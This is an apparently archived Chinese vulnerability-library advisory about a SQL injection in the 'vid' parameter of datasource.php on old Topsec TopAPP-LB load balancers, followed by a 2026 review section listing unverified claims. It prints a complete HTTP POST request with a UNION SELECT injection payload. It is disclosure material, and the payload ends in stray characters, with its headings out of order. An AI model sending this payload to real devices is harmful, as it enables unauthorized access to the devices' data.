---
date: "Sat, 12 Sep 2020 02:06:44 +0000"
draft: "false"
tags: "['白阁-漏洞库']"
id: "vw-9e52366298af505519dfbdf0"
entity_id: "ve-9e52366298af505519dfbdf0"
schema_version: "1"
title: "3、影响版本"
product: "Topsec TopAPP-LB"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "V1.2.8.0#xxx，2014前售出；管理面可达，认证未明确"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
---

#### 影响范围：

V1.2.8.0#xxx

#### 漏洞验证

天融信负载均衡 TopAPP-LB产品旧版本在管理面存在SQL注入漏洞，具体为在可以访问管理服务情况 下，攻击者通过构造恶意请求，利用系统检查输入条件不严格的缺陷，进一步可获取部分系统本地信息。


```HTML
POST /acc/clsf/report/datasource.php HTTP/1.1
Host: localhost
Connection: close
Accept: text/javascript, text/html, application/xml, text/xml, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded 

t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。

```

# 3、影响版本

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Topsec TopAPP-LB
- 本文讨论：datasource.php vid SQL注入
- 版本、权限与配置前提：V1.2.8.0#xxx，2014前售出；管理面可达，认证未明确
- 资料类型：历史SQL注入通告摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- frontmatter title空行；载荷尾@。。杂字符，无响应输出
- 无正式厂商公告链接，修复仅联系技术团队

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 版本范围及认证/修复依据待原始通告确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


V1.2.8.0#xxx ，该版本存在于 2014年之前销售的产品。

# 4、修复建议

如您正在使用 TopAPP-LB以上版本产品，请联系天融信当地技术团队或者官方服务热线。


---

> 来源：白阁文库 BaizeSec/bylibrary
